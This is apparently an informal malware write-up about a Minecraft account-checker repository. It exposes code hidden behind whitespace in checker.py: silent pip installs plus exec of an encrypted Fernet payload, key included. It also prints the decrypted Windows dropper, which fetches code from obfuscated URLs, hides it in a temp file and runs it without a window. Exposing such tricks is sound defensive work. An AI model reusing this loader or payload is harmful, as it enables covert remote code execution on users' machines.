# Ello so here i point out shit that dont make sense and malware.. in username checkers.. yea that's just sad imo
### Obviously dont run anything i show/expose here

## First: 'Minecraft-Account-Checker'  
[Minecraft-Account-Checker](https://github.com/Ashleyy5444/Minecraft-Account-Checker)  
so first. why are there 4 collaborators but only 1 exists?, im assuming the others got terminated.. not surprising  
when u go to the [checker.py](https://github.com/Ashleyy5444/Minecraft-Account-Checker/blob/main/checker.py) and you look at the second line.. it's interestingly not just 17 bytes/letters which it makes it seem like, nah, instead it's a bunch of spaces (or other whitespace chars) which lead to:  
``` python 
;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; exec(Fernet(b'paBkGFyUBwdYIVBc1A3jkWMZgIhDT90DhIZ0TX2NAhY=').decrypt(b'gAAAAABoK3gFZ_8Zv8XN3GkAPnZnlDA7XXpIKQPZpp6Q3vHb2dzhyTjF-EGszZOVw9DlDtt77cn1VUx7vZm_ZfKeiP0FhfeuGiTLtiBXyT922whNl1xdzC0oYszEk_F4UMMK02x7fqxkJbEa547hYQ-Bv-DqFCfkDGkmsw53KYRbPGgDEWfEnGWwRNz6uaFGcJ_HAsXKhc1qRBcae8PhloLVGCVcn1wSeUx78aY2QtbGDRkJMhEPeS57Y_G_uWmVLpPZQ2aK_A1QdapyTfLHe08s6cKWZMDhPS8TDajYfvbGbSCIrRm64TJxiLxAbDp_F6JQx6BPfLBxQeuEgHrz8hJSX8J8qiNDoGJTbezLfNeaoqtNgMW46ZR49CJM1Jdhzv5cB44gxIEUCToXESGKF4Dw3KDkWDJpLPJRCIWH_Dv0FyPZ0HVzBYmKUPfXFmbq3fqEfStPBOxE3tsaFEMyTls40Pyfv10DdowkUPujxxpdGHcviKfZFHMkTbqbjX8FVOCIXBIdOXhHa_TixfPwpzDmAJEKXWvN__1sgsfZWzia5QYFyhNMzhBUDyNGm1jZuhJqg-JTPB4KpHATC1zf14Pmd90tMf6265vHdVfzne-hAowywczkI_nOPyOf54z3HgrwMWNTpnSPtLSFOtf0R7UaD5g31JahnoeHIDRlEhn_NDbEWWM7Ud28LJXmz1_vQyvbKbTGg-O3uxsI70vY3WTTLPL7OFJeYPZwyaCDlCH6130i9psQAWEdA_MWiDGpBYmDsitzMqe4crgCmHTsOuvdCZRkDRx1F69REOG6TGiFXYdAHSXVd19pXX7pacJeEuo3AtOWx6vrRLIRU5ccJoHLW24saGoXfgwJVMBN6tQSql61RCvDQdtuvJd5TOJ6xljkNUmB-nDDETRWHgKbT90lmfjZewKbyLB5eFHRxdPDyKOt_4ccTQno8d2y4_8YNRF6smeIxsHuBWrLprPjkey5Vd0-NRF-fjJ4IIUAXhZWX2E6xUOA4rEpbkRXhSNh-xbjB5PsBeqTbTEQ_5kIBsUqHEm5QD0FDGTqMz0NbNmqX-zG6Kk__lbxo7FyFptUiZ5uyjvGf4BshYU5gqGSaGURn0XOUXZSvzuRzo-BUrTs4s-hRU_qrP7QhKPOYtiLZTlVW5p2IZj3MA0an5uRrj8OGSl30evXA_l3frfcieO8gb4uTt1ULd8uXHAEXRf8841Uvs7rUGdOBqGm280oU0gEh2lYtaKZeld8NRK3UR9RJ28e5qj8qtXy5WPnCOc61vlafzOlb5U1VS5A4-6TXcF6UN0yu3ojlchenpr9nTR3m4eTvN34xeW_XqQZhn3ghIrlQvpeuyBsWGdDs8gqXo3hOq9jGG392zyf45tfkXT9x6BwGGbpSghVLxNp25SzXou-d6jhqDBEiQasfgMQVwRz_Qs-3QstggIi-UaSG8CQZPcTTtaYpN2vADPcyo0IEibaplKGqcHw80-dgJ7jzsHrwqIzF3NQ3XxhCVK329p7-4Nm2D5bewrZ-jtZEpJKFieepU5XEO1OgSvrbE6DzKTdvT89vqHsIR38jU0P-mQolU2jmK1cKu3v0jhk24can-cbMAb72PqaE6oJLIa1HfyuwYwMLlwRE7zGYKMbTnHqa3_4FKnJ_wWzlop0gXovcz88Prk-hLa7HxPu3F8p7qe8PlwpxxEEFSfeNZQNBHPvw30LcMCDbDDgyFqPfQVmcj8MyvI9uqLpMoka8b7sQEMG5y4VcavLQ1lTpcFy6bO3p-NXZfP8G8K6CJHeU87RaAEY3_ofk59EIUetjsXoiwe0FtF1m5N6JxJckTNYD5jqRjy_hiinU7Ka-ILk5Xehwc0mWGS9kwBcP8Wav4Fox52SXtGA8gwCwZ5UaoVCDfnSjhTLOyxlabHgoJdBjKUdapgRtontSOQT812eY1L_xh1Ld1v70qU6ZaCYnW1XT3SGlQYYWyUiAHm_0G63eHQkEZDoNizbdmkudUV8QZtAU7Y8dnQ3-Z5PhTq007g3HuvEtPvSER_sCd2p6tpxDzjb13IYOm4zc87TJgQrQWOWcsDFVdnmN6sWYA=='));
```
so yea, that looks alot like malware, interesting right?  
also why does the checker have over 1,4K commits? (1,435 to be exact), well it's just so it's at the top (or close to it) of latest updated for when u search for a username checker  
OH btw, if u look at the size - it's 6.71 KB with 79 lines.. (it'd be about 2,5 KB without the malware) mine is 23.6 KB but it has over 500 lines so  
also i love how it doesnt even use the colorama,subprocess or os imports in the actual script, but it does for the malware ig  
here's what u get if u decode the fernet encoding (im not decoding the b64):  
``` python
import base64;import os;import sys;import requests;import re;import tempfile;import uuid;import ctypes;import subprocess
u1="w57DncOWw5XCocKqwqHCnsOVw5HDnMOgW8OFw6jDosKdw5vDoMOUw5vCm8K8wrbDkcOYwqHCn8Okw5DDmg=="
u2="w57DncOWw5XCocKqwqHCnsOWw5TDmcOnWsOSw7LDqcOWw5rDnMKcw53Do8Okw5fDm8KTwpXDnMObw6PDhsONwqHDoMKSwpHDrMOew5vDm8Oaw5TCpcOXw6U="
u3="w57DncOWw5XCocKqwqHCnsOTw4bDpsOnwpLDhMOiw6PCnMOOw53DnMKmw6DDl8OgwpHDi8KHw6LCqsOpw4bCr8Ok"
ps="vibe.process-byunknown"
def d(p, l):return ''.join(chr(ord(c) - ord(l[i % len(l)])) for i, c in enumerate(base64.b64decode(p).decode('utf-8')))
def st(f):FH=0x02;FS=0x04;ctypes.windll.kernel32.SetFileAttributesW(f,FH|FS)
def main():
    rd = None
    try:
        dcu1=d(u1,ps);r=requests.get(dcu1)
        if r.status_code==200:rd=r.text
    except:return
    if not rd:
        try:
            dcu2=d(u2,ps);r=requests.get(dcu2)
            if r.status_code==200:rd=r.text
        except:return
    if not rd:
        try:
            dcu3=d(u3,ps);r=requests.get(dcu3)
            if r.status_code==200:rd=r.text
        except:return
    if not rd: return
    try:
        ds = d(rd, ps)
        if not ds:return
        sp = os.path.join(tempfile.gettempdir(), f'{str(uuid.uuid4())}.py')
        with open(sp, 'w', encoding='utf-8') as sf:sf.write(ds)
        st(sp);subprocess.Popen([sys.executable, sp],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    except:return
if __name__ == "__main__":
    main()
```
Also seems to be targeted towards the windows operating system so yea
